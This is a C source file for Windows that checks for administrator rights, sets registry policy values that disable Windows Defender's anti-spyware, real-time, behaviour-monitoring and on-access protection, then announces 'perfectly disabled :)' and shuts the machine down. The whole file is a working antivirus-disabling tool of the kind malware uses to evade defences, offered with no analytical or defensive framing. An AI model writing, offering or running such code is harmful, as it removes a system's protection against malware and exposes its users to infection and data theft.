#include <Windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdbool.h>

bool isUserAdmin()
{
    BOOL isAdmin = FALSE;
    PSID sid = NULL;

    // Allocate a buffer for the SID.
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid);

    // Check if the current process is running with administrative privileges.
    if (CheckTokenMembership(NULL, sid, &isAdmin))
    {
        // The current process is running with administrative privileges.
        return (isAdmin != FALSE);
    }
    else
    {
        // There was an error checking the token membership.
        printf("Error checking token membership: %d\n", GetLastError());
        return false;
    }
}

int main(void)
{
	  HKEY key;
	  HKEY new_key;
	  DWORD disable = 1;

	  if (!isUserAdmin()) {
		printf("please, run as admin.\n");
		return -1;
	  };
	  
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
 

 if (res == ERROR_SUCCESS) {
    RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
    RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

    RegCloseKey(key);
    RegCloseKey(new_key);
  }

	  printf("perfectly disabled :)\npress any key to restart to apply them.\n");
	  system("pause");
	  system("C:\\Windows\\System32\\shutdown /s /t 0");
	  return 1;


}

